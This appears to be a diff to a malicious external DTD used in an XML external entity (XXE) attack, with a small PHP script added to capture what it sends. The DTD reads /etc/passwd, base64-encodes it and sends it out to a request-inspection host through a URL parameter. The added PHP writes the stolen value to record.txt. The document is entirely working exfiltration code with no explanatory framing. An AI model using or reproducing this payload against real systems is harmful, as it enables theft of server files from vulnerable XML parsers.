@@ -1,4 +1,8 @@
+
+<?php
+file_put_contents('record.txt', $_GET['file']);
+?>
 <!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
-<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'https://requestinspector.com/inspect/01dtzncsf04snzhraqc02ae3v9/%payload;'>">
+<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'https://requestinspector.com/inspect/01dtzncsf04snzhraqc02ae3v9/xml.php?file=%payload;'>">
 %int;
 %trick;
